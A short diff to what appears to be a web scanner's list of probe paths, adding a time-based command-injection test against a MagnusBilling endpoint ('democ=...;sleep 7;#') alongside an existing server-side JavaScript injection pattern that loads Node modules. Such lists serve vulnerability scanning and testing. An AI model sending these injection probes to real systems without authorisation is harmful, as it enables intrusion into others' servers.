@@ -40,3 +40,6 @@ login
 /wfs?service=WFS
 /ows?service=WFS
 ?view[path]={{pfield}}&view[match][$where]=global.process.mainModule.constructor._load(
+/mbilling/lib/icepay/icepay.php?democ={{randstr}};sleep%207;#
+/mftp/
+/
